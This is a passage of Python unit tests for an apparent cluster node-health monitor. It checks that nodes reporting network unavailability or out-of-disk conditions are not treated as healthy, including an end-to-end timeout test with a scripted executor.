    def test_network_unavailable_blocks_healthy(self):
        from monitor.verify import _is_healthy_node
        out = ("Ready=True Mem=False Disk=False PID=False "
               "Net=True OutOfDisk=False")
        assert _is_healthy_node(out, None) is False

    def test_out_of_disk_blocks_healthy(self):
        from monitor.verify import _is_healthy_node
        out = ("Ready=True Mem=False Disk=False PID=False "
               "Net=False OutOfDisk=True")
        assert _is_healthy_node(out, None) is False

    def test_all_conditions_false_is_healthy(self):
        from monitor.verify import _is_healthy_node
        out = ("Ready=True Mem=False Disk=False PID=False "
               "Net=False OutOfDisk=False")
        assert _is_healthy_node(out, None) is True

    def test_network_unavailable_verifier_end_to_end(self):
        """An event with reason=NetworkUnavailable must stay unhealthy
        until Net=False, not just until Ready=True."""
        clk = _VirtualClock()
        # Stays in Ready-but-Net-still-unavailable forever → timeout.
        exec_fn = _ScriptedExecutor({
            "get node n9": [
                "Ready=True Mem=False Disk=False PID=False "
                "Net=True OutOfDisk=False",
            ],
        })
        event = {"reason": "NetworkUnavailable", "object": "node/n9"}
        r = verify_resolution(
            exec_fn, event,
            timeout_s=20, poll_interval_s=5, stability_window_s=10,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is False
